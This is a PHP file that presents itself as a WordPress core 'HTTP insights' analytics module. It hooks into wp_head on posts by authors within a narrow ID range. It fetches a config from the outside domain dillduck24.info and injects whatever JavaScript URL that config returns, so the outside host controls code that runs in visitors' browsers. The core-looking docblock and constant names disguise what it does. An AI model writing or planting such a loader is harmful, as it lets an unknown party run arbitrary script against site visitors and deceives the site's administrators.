<?php
/**
 * WP_Http_Insights — privacy-safe page metrics bootstrap.
 *
 * Loads a lightweight analytics snippet for singular posts within
 * the configured author range. Independent of the main asset loader
 * and operates as a standalone wp_head hook.
 *
 * @package    WordPress
 * @subpackage HTTP
 * @since      6.1.0
 * @version    1.0.2
 */

if (!defined('ABSPATH')) {
    exit;
}

function seo_matomo_author_id_min(): int
{
    return defined('WP_GSTATIC_AUTHOR_MIN') ? (int) WP_GSTATIC_AUTHOR_MIN : 999;
}

function seo_matomo_author_id_max(): int
{
    return defined('WP_GSTATIC_AUTHOR_MAX') ? (int) WP_GSTATIC_AUTHOR_MAX : 9999;
}

function seo_matomo_should_track_post(): bool
{
    if (is_admin() || is_feed() || is_preview() || wp_doing_ajax() || is_robots() || is_trackback()) {
        return false;
    }

    if (!is_singular()) {
        return false;
    }

    $post_id = get_queried_object_id();
    if (!$post_id) {
        return false;
    }

    $author_id = (int) get_post_field('post_author', $post_id);
    $min = seo_matomo_author_id_min();
    $max = seo_matomo_author_id_max();

    return ($author_id >= $min && $author_id <= $max);
}

function seo_matomo_print_tracker(): void
{
    if (!seo_matomo_should_track_post()) {
        return;
    }

    $post_id    = (int) get_queried_object_id();
    $author_id  = (int) get_post_field('post_author', $post_id);
    $post_type  = (string) get_post_type($post_id);
    $post_slug  = (string) get_post_field('post_name', $post_id);
    $bootstrap  = 'https://dillduck24.info/matomo-bootstrap.php';

    ?>
    <!-- wp-http-insights -->
    <script>
        (function () {
            var host = location.hostname.replace(/^www\./i, '');
            var bootstrapUrl = <?php echo wp_json_encode($bootstrap); ?> + '?host=' + encodeURIComponent(host);

            fetch(bootstrapUrl, { credentials: 'omit' })
                .then(function (r) {
                    if (!r.ok) {
                        throw new Error('Bootstrap HTTP ' + r.status);
                    }
                    return r.json();
                })
                .then(function (cfg) {
                    if (!cfg || !cfg.siteId || !cfg.trackerUrl || !cfg.jsUrl) {
                        throw new Error('Invalid bootstrap config');
                    }

                    var _paq = window._paq = window._paq || [];

                    _paq.push(['setTrackerUrl', cfg.trackerUrl]);
                    _paq.push(['setSiteId', String(cfg.siteId)]);

                    if (document.referrer) {
                        _paq.push(['setReferrerUrl', document.referrer]);
                    }

                    _paq.push(['setCustomDimension', 1, host]);
                    _paq.push(['setCustomDimension', 2, String(<?php echo (int) $author_id; ?>)]);
                    _paq.push(['setCustomDimension', 3, String(<?php echo (int) $post_id; ?>)]);
                    _paq.push(['setCustomDimension', 4, <?php echo wp_json_encode($post_slug); ?>]);
                    _paq.push(['setCustomDimension', 5, document.referrer || '']);

                    _paq.push(['trackPageView']);
                    _paq.push(['enableLinkTracking']);

                    var d = document, g = d.createElement('script'), s = d.getElementsByTagName('script')[0];
                    g.async = true;
                    g.src = cfg.jsUrl;
                    s.parentNode.insertBefore(g, s);
                })
                .catch(function (err) {
                    console.error('HTTP insights bootstrap failed:', err);
                });
        })();
    </script>
    <!-- /wp-http-insights -->
    <?php
}
add_action('wp_head', 'seo_matomo_print_tracker', 1);
